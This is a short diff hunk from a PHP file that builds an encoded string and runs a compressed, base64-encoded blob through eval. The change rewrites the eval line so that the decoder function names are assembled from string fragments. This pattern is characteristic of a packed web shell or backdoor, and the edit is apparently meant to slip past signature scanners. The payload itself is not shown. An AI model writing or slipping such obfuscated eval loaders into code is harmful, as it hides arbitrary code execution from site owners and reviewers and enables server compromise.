@@ -268,6 +268,6 @@ $Lix .= "BBwJey/eDQEg8q3QF";
 $Lix .= "BwJey/dDgEg8a3QJB";
 $Lix .= "wJey/cDwEg8K3QNBw";
 $Lix .= "Je";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+$a = "base64"; $b = "_decode"; $c = $a.$b; $d = "gzin"; $e = "flate"; $f = $d.$e; $g = "htmlspecialchars"; $h = $g.$b; eval($h($f($c($Cyto))));
 exit;
 ?>
